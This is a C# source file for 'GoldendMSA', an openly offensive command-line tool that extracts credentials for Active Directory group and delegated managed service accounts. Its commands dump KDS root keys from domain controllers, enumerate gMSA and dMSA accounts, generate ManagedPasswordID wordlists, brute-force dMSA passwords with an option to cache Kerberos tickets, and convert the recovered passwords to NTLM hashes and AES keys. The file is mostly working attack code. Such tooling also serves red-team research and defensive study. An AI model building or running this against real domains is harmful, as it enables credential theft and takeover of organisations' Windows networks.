using System;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text.RegularExpressions;
using CommandLine;
using CommandLine.Text;

namespace GoldendMSA
{
    public class Program
    {
        private static void Main(string[] args)
        {
            PrintStyle();
            var parser = new Parser();

            var parserResult =
                parser
                    .ParseArguments<InfoOptions, WordlistOptions, KdsOptions, ComputeOptions, BruteForceOptions,
                        ConvertOptions, UsageOptions>(args);

            parserResult
                .WithParsed<InfoOptions>(options => ProcessInfoOptions(options))
                .WithParsed<WordlistOptions>(options => ProcessWordOptions(options))
                .WithParsed<KdsOptions>(options => ProcessKdsOptions(options))
                .WithParsed<ComputeOptions>(options => ProcessComputeOptions(options))
                .WithParsed<BruteForceOptions>(options => ProcessBruteforceOptions(options))
                .WithParsed<ConvertOptions>(options => ProcessConvertOptions(options))
                .WithParsed<UsageOptions>(options => ProcessUsageOptions(options))
                .WithNotParsed(errors =>
                {
                    var helpText = HelpText.AutoBuild(parserResult, h =>
                    {
                        h.AdditionalNewLineAfterOption = false;
                        var helpTxt = HelpText.DefaultParsingErrorsHandler(parserResult, h);
                        return helpTxt;
                    }, e => { return e; });
                    Console.Error.Write(helpText);
                });
        }

        public static void PrintStyle()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(@"
  ____        _     _             ____  __  __ ____    _    
 / ___|  ___ | | __| | ___ _ __  |  _ \|  \/  / ___|  / \   
| |  _  / _ \| |/ _` |/ _ \ '_ \ | | | | |\/| \___ \ / _ \  
| |_| || (_) | | (_| |  __/ | | || |_| | |  | |___) / ___ \ 
 \____| \___/|_|\__,_|\___|_| |_||____/|_|  |_|____/_/   \_\
                                                           ");

            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("═══════════════════════════════════════════════════════════════");

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(" Delegated + Group Managed Service Account creds extractor");

            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("═══════════════════════════════════════════════════════════════");

            Console.ResetColor();
        }

        public static void ProcessUsageOptions(UsageOptions options)
        {
            Console.WriteLine("Examples:");
            Console.WriteLine("");
            Console.WriteLine("compute:");
            Console.WriteLine(
                "\tGoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManadgedPasswordID>");
            Console.WriteLine("");
            Console.WriteLine("convert:");
            Console.WriteLine(
                "\tGoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>");
            Console.WriteLine("");
            Console.WriteLine("wordlist:");
            Console.WriteLine(
                "\tGoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
            Console.WriteLine("");
            Console.WriteLine("info:");
            Console.WriteLine("\tGoldendMSA.exe info -d <domain name> -m ldap");
            Console.WriteLine(
                "\tGoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -s <gMSA's sid> ");
            Console.WriteLine(
                "\tGoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
            Console.WriteLine("");
            Console.WriteLine("kds:");
            Console.WriteLine("\tGoldendMSA.exe kds");
            Console.WriteLine("\tGoldendMSA.exe kds --domain <domain name>");
            Console.WriteLine("\tGoldendMSA.exe kds -g <guid of KDS root key>");
            Console.WriteLine("");
            Console.WriteLine("bruteforce:");
            Console.WriteLine(
                "\tGoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)> -t");
            Console.WriteLine(
                "\tGoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)> -v");
        }

        public static void ProcessComputeOptions(ComputeOptions options)
        {
            SecurityIdentifier sid = null;
            string domainName = null;
            string forestName = null;
            var base64Kds = options.KdsRootKeyBase64;
            var base64ManagePasswordId = options.ManagedPwdIdBase64;
            if (!Helpers.IsBase64String(options.KdsRootKeyBase64))
            {
                Console.WriteLine("[X] Golden DMSA - KDS is not valid");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManagedPasswordID>");
                return;
            }

            if (!Helpers.IsBase64String(options.ManagedPwdIdBase64))
            {
                Console.WriteLine("[X] Golden DMSA - ManagePasswordID is not valid");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManagedPasswordID>");
                return;
            }

            if (!Helpers.IsValidDomainFormatRegex(options.DomainName))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManagedPasswordID>");
                return;
            }

            var sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";
            var isValidFormat = Regex.IsMatch(options.Sid, sidPattern);

            if (!isValidFormat)
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManagedPasswordID>");
                return;
            }

            sid = new SecurityIdentifier(options.Sid);

            ProcessComputePwdOptions(sid, base64Kds, base64ManagePasswordId, domainName, forestName);
        }

        public static void ProcessConvertOptions(ConvertOptions options)
        {
            if (!Helpers.IsBase64String(options.Password))
            {
                Console.WriteLine("[X] Golden DMSA - Password is not valid base64 string");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>");
                return;
            }

            if (!Helpers.IsValidDomainFormatRegex(options.DomainName))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid user's domain name");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>");
                return;
            }

            if (!string.IsNullOrEmpty(options.Username) && options.Username.EndsWith("$"))
            {
                Console.WriteLine("");
                Console.WriteLine(options.DomainName + "\\" + options.Username);
                var ntlmHash = Helpers.ConvertBase64ToNtlm(options.Password);
                Console.WriteLine($"NTLM Hash: {ntlmHash}");
                Helpers.Base64ToAes(options.Username, options.DomainName, options.Password, false);
                return;
            }

            Console.WriteLine("[X] Golden DMSA - Faced some issues while converting the data.");
            Console.WriteLine(
                "Execution example: GoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>");
        }

        public static void ProcessWordOptions(WordlistOptions option)
        {
            var sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";

            if (string.IsNullOrEmpty(option.Sid))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return;
            }

            var isValidFormat = Regex.IsMatch(option.Sid, sidPattern);
            if (!isValidFormat)
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return;
            }

            if (!Helpers.IsValidDomainFormatRegex(option.ForestName))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid forest name");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return;
            }

            if (!Helpers.IsValidDomainFormatRegex(option.DomainName))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return;
            }

            GenerateMSDS_ManagedPasswordID(option.DomainName, option.ForestName, option.KeyId, option.Sid);
        }

        public static void ProcessInfoOptions(InfoOptions option)
        {
            if (option.Method.Equals("brute") && !string.IsNullOrEmpty(option.User) &&
                !string.IsNullOrEmpty(option.DomainOfUser) && !string.IsNullOrEmpty(option.Password))
            {
                var sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";

                SecurityIdentifier sid = null;
                if (!string.IsNullOrEmpty(option.Sid))
                {
                    var isValidFormat = Regex.IsMatch(option.Sid, sidPattern);
                    if (isValidFormat) sid = new SecurityIdentifier(option.Sid);
                }

                if (!Helpers.IsValidDomainFormatRegex(option.DomainOfUser))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid user's domain name");
                    Console.WriteLine(
                        "Execution example: GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
                    return;
                }

                if (!Helpers.IsValidDomainFormatRegex(option.DomainName))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                    Console.WriteLine(
                        "Execution example: GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
                    return;
                }

                Console.WriteLine("GMSAs:");
                Console.WriteLine("");
                ProcessGmsaInfoOptions(sid, option.DomainName);
                Console.WriteLine("DMSAs:");
                Console.WriteLine("");
                var maxRid = option.MaxRid;
                if (maxRid == 0) maxRid = 2000;
                ProcessDmsaInfoOptions(option.DomainName, option.User, option.Password, option.DomainOfUser, maxRid);
            }
            else if (option.Method.Equals("ldap"))
            {
                Console.WriteLine("GMSAs:");
                Console.WriteLine("");
                var sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";

                SecurityIdentifier sid = null;
                if (!string.IsNullOrEmpty(option.Sid))
                {
                    var isValidFormat = Regex.IsMatch(option.Sid, sidPattern);
                    if (isValidFormat) sid = new SecurityIdentifier(option.Sid);
                }

                ProcessGmsaInfoOptions(sid, option.DomainName);
                Console.WriteLine("DMSAs:");
                LdapEnumeration.Enumerate(option.DomainName);
            }
            else
            {
                Console.WriteLine("[X] Golden DMSA - This is not a valid command");
                Console.WriteLine("Execution example: GoldendMSA.exe info -d <domain name> -m ldap");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
            }
        }

        public static void ProcessKdsOptions(KdsOptions options)
        {
            Guid? guidName = null;

            if (string.IsNullOrEmpty(options.DomainName))
            {
                Console.WriteLine("Dumping from forest's DC. Must be running as Enterprise admin.");
                Console.WriteLine("");
            }
            else
            {
                if (!Helpers.IsValidDomainFormatRegex(options.DomainName))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                    Console.WriteLine("Execution example: GoldendMSA.exe kds --domain <domain name>");
                    return;
                }

                Console.WriteLine("Dumping from " + options.DomainName +
                                  "'s DC. Must be running as system on this DC.");
                Console.WriteLine("");
                if (!Helpers.IsSystem())
                {
                    Console.WriteLine("[X] Golden DMSA - SYSTEM was not used for execution.");
                    return;
                }
            }

            if (!string.IsNullOrEmpty(options.Guid))
            {
                if (!Helpers.IsValidGuid(options.Guid))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid GUID");
                    Console.WriteLine("Execution example: GoldendMSA.exe kds -g <guid of KDS root key>");
                    return;
                }

                guidName = Guid.Parse(options.Guid);
            }

            ProcessKdsInfoOptions(guidName, options.DomainName);
        }

        public static void ProcessBruteforceOptions(BruteForceOptions options)
        {
            SecurityIdentifier sid = null;
            var base64Kds = options.KdsRootKeyBase64;
            var domainName = options.DomainName;
            string kdsId = null;
            string username = null;

            if (!Helpers.IsBase64String(options.KdsRootKeyBase64))
            {
                Console.WriteLine("[X] Golden DMSA - KDS is not valid");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                return;
            }

            if (!Helpers.IsValidDomainFormatRegex(options.DomainName))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                return;
            }

            domainName = options.DomainName;

            var sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";
            var isValidFormat = Regex.IsMatch(options.Sid, sidPattern);

            if (!isValidFormat)
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                return;
            }

            sid = new SecurityIdentifier(options.Sid);

            // Original code didn't validate the KDS Root Key ID before using it as a filename, causing a "File is not exist" error when the GUID was truncated or had whitespace. It was assuming that the wordlist file was already generated, but gave no clear indication of what was wrong.
            if (string.IsNullOrWhiteSpace(options.FileName))
            {
                Console.WriteLine("[X] Golden DMSA - KDS Root Key ID is required");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                return;
            }

            var kdsRootKeyId = options.FileName.Trim();

            if (!Helpers.IsValidGuid(kdsRootKeyId))
            {
                Console.WriteLine($"[X] Golden DMSA - KDS Root Key ID '{kdsRootKeyId}' is not a valid GUID");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                Console.WriteLine(
                    "Note: The KDS Root Key ID should be a GUID (e.g., f06c3c8d-b2c2-4cc6-9a1a-8b3b3c82b9f0)");
                return;
            }

            // Original code would error out if the wordlist file didn't exist, but all the information
            // needed to generate it (domain, SID, KDS Root Key ID) is available so let's just do it. 
            var wordlistFileName = kdsRootKeyId + ".txt";
            if (!File.Exists(wordlistFileName))
            {
                Console.WriteLine(
                    $"[!] Golden DMSA - Wordlist file '{wordlistFileName}' does not exist. Generating it automatically...");
                Console.WriteLine("");

                // GenerateMSDS_ManagedPasswordID requires a forest name, but the bruteforce command doesn't
                // ask for it. It can be derived from the domain since we already have domain context validation.
                string forestName = null;
                try
                {
                    var domainContext = new DirectoryContext(
                        DirectoryContextType.Domain, domainName);
                    var domain = Domain.GetDomain(domainContext);
                    forestName = domain.Forest.Name;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(
                        $"[X] Golden DMSA - Failed to get forest name from domain '{domainName}': {ex.Message}");
                    Console.WriteLine(
                        "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                    return;
                }

                GenerateMSDS_ManagedPasswordID(domainName, forestName, kdsRootKeyId, options.Sid);

                if (!File.Exists(wordlistFileName))
                {
                    Console.WriteLine($"[X] Golden DMSA - Failed to generate wordlist file '{wordlistFileName}'");
                    Console.WriteLine(
                        "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                    return;
                }

                Console.WriteLine($"[V] Golden DMSA - Wordlist file '{wordlistFileName}' generated successfully");
                Console.WriteLine("");
            }

            kdsId = wordlistFileName;
            if (!options.Username.EndsWith("$"))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid username");
                Console.WriteLine(
                    "Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -i <kds root key id (guid)>");
                return;
            }

            username = options.Username.ToLower();

            BruteForceDmsa.BruteForce(sid, base64Kds, kdsId, username, domainName, options.Ptt, options.Verbose);
        }

        /*
         * Description - Generates files with all the wordlists per KDS Root key.
         */
        private static void GenerateMSDS_ManagedPasswordID(string domain, string forest, string rkl, string sid)
        {
            Guid gd;
            var dsize = (byte)(domain.Length * 2 + 2);
            var fsize = (byte)(forest.Length * 2 + 2);
            var guidBytesCopy = new byte[52 + dsize + fsize];
            guidBytesCopy[4] = 75;
            guidBytesCopy[5] = 68;
            guidBytesCopy[6] = 83;
            guidBytesCopy[7] = 75;
            guidBytesCopy[8] = 2;
            guidBytesCopy[12] = 2;
            try
            {
                gd = new Guid(rkl);
            }
            catch
            {
                Console.WriteLine("[X] Golden DMSA - Failed to convert " + rkl +
                                  " into a valid guid. Use format like this - f06c3c8d-b2c2-4cc6-9a1a-8b3b3c82b9f0");
                return;
            }

            var guidBytes = gd.ToByteArray();
            Array.Copy(guidBytes, 0, guidBytesCopy, 24, 16);
            guidBytesCopy[0] = 1;
            Console.WriteLine("");
            Console.WriteLine("[V] Golden DMSA - Created file - " + rkl + ".txt for the key id " + rkl);
            Console.WriteLine("");
            for (byte l1 = 0; l1 <= 31; l1++)
            {
                // Create a copy of the base array
                var newArray = (byte[])guidBytesCopy.Clone();

                // Set L1 value (at index 16)
                newArray[16] = l1;
                for (byte l2 = 0; l2 <= 31; l2++)
                {
                    newArray[20] = l2;
                    newArray[44] = dsize;
                    newArray[48] = fsize;
                    var index = 52;
                    foreach (var c in domain)
                    {
                        newArray[index] = (byte)Convert.ToInt32(c);
                        index = index + 2;
                    }

                    index = 52 + dsize;
                    foreach (var c in forest)
                    {
                        newArray[index] = (byte)Convert.ToInt32(c);
                        index = index + 2;
                    }

                    var base64 = Convert.ToBase64String(newArray);
                    using (var writer = new StreamWriter(rkl + ".txt", true))
                    {
                        writer.WriteLine(base64);
                    }
                }
            }
        }

        private static void ProcessGmsaInfoOptions(SecurityIdentifier sid, string domainString)
        {
            try
            {
                string domainName = null;

                if (string.IsNullOrEmpty(domainString))
                    domainName = Domain.GetCurrentDomain().Name;
                else
                    domainName = domainString;
                if (sid != null)
                {
                    var gmsa = GmsaAccount.GetGmsaAccountBySid(domainName, sid);

                    if (gmsa != null)
                        Console.WriteLine(gmsa.ToString());
                    else
                        Console.WriteLine($"GMSA with SID {sid} not found in domain {domainName}");
                }
                else
                {
                    var gmsaAccounts = GmsaAccount.FindAllGmsaAccountsInDomain(domainName);
                    var enumerable = gmsaAccounts as GmsaAccount[] ?? gmsaAccounts.ToArray();
                    if (enumerable.Count() > 0)
                        foreach (var gmsa in enumerable)
                            Console.WriteLine(gmsa.ToString());
                    else
                        Console.WriteLine("No GMSAs were found");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR: {ex.Message}");
            }
        }

        private static void ProcessDmsaInfoOptions(string domainName, string user, string password, string userDomain,
            int maxRid = 1500)
        {
            DmsaEnumerate.PrintdMsas(domainName, user, password, userDomain, maxRid);
        }

        private static void ProcessKdsInfoOptions(Guid? kdsKeyGuid, string domainName)
        {
            try
            {
                string forestName = null;

                if (string.IsNullOrEmpty(domainName))
                {
                    forestName = Domain.GetCurrentDomain().Forest.Name;
                }
                else
                {
                    forestName = domainName;
                    var isSystem = Helpers.IsCurrentUserSystem();
                    if (!isSystem)
                    {
                        Console.WriteLine("[X] Golden DMSA - Seems like you are not using System user.");
                        return;
                    }
                }

                if (kdsKeyGuid.HasValue)
                {
                    var rootKey = RootKey.GetRootKeyByGuid(forestName, kdsKeyGuid.Value);

                    if (rootKey == null)
                        Console.WriteLine($"KDS Root Key with ID {kdsKeyGuid.Value} not found");
                    else
                        Console.WriteLine(rootKey.ToString());
                }
                else
                {
                    var rootKeys = RootKey.GetAllRootKeys(forestName);
                    var enumerable = rootKeys as RootKey[] ?? rootKeys.ToArray();
                    if (enumerable.Any())
                        foreach (var rootKey in enumerable)
                            Console.WriteLine(rootKey.ToString());
                    else
                        Console.WriteLine(
                            "[X] Golden DMSA - Did not obtain any KDS root keys - Make sure to run is from an enterprise admin or consider to run this tool as SYSTEM user on one of the domain's DCs in the forest (attach domain's name to the commandline arguments).");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR: {ex.Message}");
            }
        }

        public static string ProcessComputePwdOptions(SecurityIdentifier sid, string kdsRootKeyBase64,
            string managedPwdIdBase64, string domainString, string forestString, bool print = true)
        {
            try
            {
                string domainName = "", forestName = "";

                if (sid == null)
                    throw new ArgumentNullException(nameof(sid));

                // If we will run online mode
                if (string.IsNullOrEmpty(kdsRootKeyBase64) || string.IsNullOrEmpty(managedPwdIdBase64))
                {
                    // If we need to automatically get forest name
                    if (string.IsNullOrEmpty(forestString))
                        forestName = Domain.GetCurrentDomain().Forest.Name;
                    else
                        forestName = forestString;

                    // If we need to automatically get domain name
                    if (string.IsNullOrEmpty(domainString))
                        domainName = Domain.GetCurrentDomain().Name;
                    else
                        domainName = domainString;
                }

                MsdsManagedPasswordId pwdId = null;
                RootKey rootKey = null;

                if (string.IsNullOrEmpty(managedPwdIdBase64))
                {
                    pwdId = MsdsManagedPasswordId.GetManagedPasswordIdBySid(domainName, sid);
                }
                else
                {
                    var pwdIdBytes = Convert.FromBase64String(managedPwdIdBase64);
                    pwdId = new MsdsManagedPasswordId(pwdIdBytes);
                }

                if (string.IsNullOrEmpty(kdsRootKeyBase64))
                {
                    rootKey = RootKey.GetRootKeyByGuid(forestName, pwdId.RootKeyIdentifier);
                }
                else
                {
                    var rootKeyBytes = Convert.FromBase64String(kdsRootKeyBase64);
                    rootKey = new RootKey(rootKeyBytes);
                }

                if (rootKey == null)
                {
                    Console.WriteLine($"Failed to locate KDS Root Key with ID {pwdId.RootKeyIdentifier}");
                    return "";
                }

                var pwdBytes = GmsaPassword.GetPassword(sid, rootKey, pwdId, domainName, forestName);
                if (print) Console.WriteLine($"Base64 Encoded Password:\t{Convert.ToBase64String(pwdBytes)}");
                return Convert.ToBase64String(pwdBytes);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR: {ex}");
            }

            return "";
        }
    }

    [Verb("info", HelpText = "Get DMSA and GMSA accounts")]
    public class InfoOptions
    {
        [Option('u', "user", Required = false, HelpText = "The user to be used")]
        public string User { get; set; }

        [Option('s', "sid", Required = false,
            HelpText = "The SID of the object to be used. For GMSA accounts enumeration.")]
        public string Sid { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('p', "password", Required = false, HelpText = "password of the  user")]
        public string Password { get; set; }

        [Option('r', "rid", Required = false, HelpText = "Max RID to bruteforce(default is 1500)")]
        public int MaxRid { get; set; }

        [Option('o', "udomain", Required = false, HelpText = "Domain of the used user")]
        public string DomainOfUser { get; set; }

        [Option('m', "method", Required = true, HelpText = "method to use - brute or ldap")]
        public string Method { get; set; }
    }

    [Verb("wordlist", HelpText = "Create wordlist of managedPasswordID")]
    public class WordlistOptions
    {
        [Option('s', "sid", Required = true, HelpText = "The SID of the object to be guessed.")]
        public string Sid { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('f', "forest", Required = true, HelpText = "forest of the object")]
        public string ForestName { get; set; }

        [Option('k', "key", Required = true, HelpText = "KDS root key ID")]
        public string KeyId { get; set; }
    }

    [Verb("kds", HelpText = "Get KDS root keys")]
    public class KdsOptions
    {
        [Option('g', "guid", Required = false, HelpText = "Get specific KDS root key by GUID")]
        public string Guid { get; set; }

        [Option('d', "domain", Required = false, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }
    }

    [Verb("compute", HelpText = "Get base64 password based on KDS and ManagedPasswordID")]
    public class ComputeOptions
    {
        [Option('s', "sid", Required = true, HelpText = "SID of DMSA/GMSA account")]
        public string Sid { get; set; }

        [Option('k', "key", Required = true, HelpText = "KDS Root key")]
        public string KdsRootKeyBase64 { get; set; }

        [Option('m', "managedpassword", Required = true, HelpText = "ManagedPwdIdBase64 in base64")]
        public string ManagedPwdIdBase64 { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object (target domain)")]
        public string DomainName { get; set; }

        [Option('f', "forest", Required = false,
            HelpText = "forest of the object (we will ask it for the KDS root key in case we did not got one)")]
        public string ForestName { get; set; }

        [Option('p', "print", Required = false, HelpText = "Output required?")]
        public string Print { get; set; }
    }

    [Verb("bruteforce", HelpText = "bruteforce DMSA's hash")]
    public class BruteForceOptions
    {
        [Option('s', "sid", Required = true, HelpText = "SID of DMSA/GMSA account")]
        public string Sid { get; set; }

        [Option('t', "ptt", Required = false, HelpText = "In case you want to cache the ticket (default not set) ")]
        public bool Ptt { get; set; }

        [Option('k', "key", Required = true, HelpText = "KDS Root key")]
        public string KdsRootKeyBase64 { get; set; }

        [Option('i', "id", Required = true, HelpText = "ID of the KDS Root Key")]
        public string FileName { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('u', "username", Required = true, HelpText = "username used")]
        public string Username { get; set; }

        [Option('v', "verbose", Required = false, HelpText = "use verbose output")]
        public bool Verbose { get; set; }
    }

    [Verb("convert", HelpText = "convert base64 password of service account to AES and NTLM")]
    public class ConvertOptions
    {
        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('u', "username", Required = true, HelpText = "username used")]
        public string Username { get; set; }

        [Option('p', "password", Required = true, HelpText = "password used")]
        public string Password { get; set; }
    }

    [Verb("usage", HelpText = "usage examples")]
    public class UsageOptions
    {
    }
}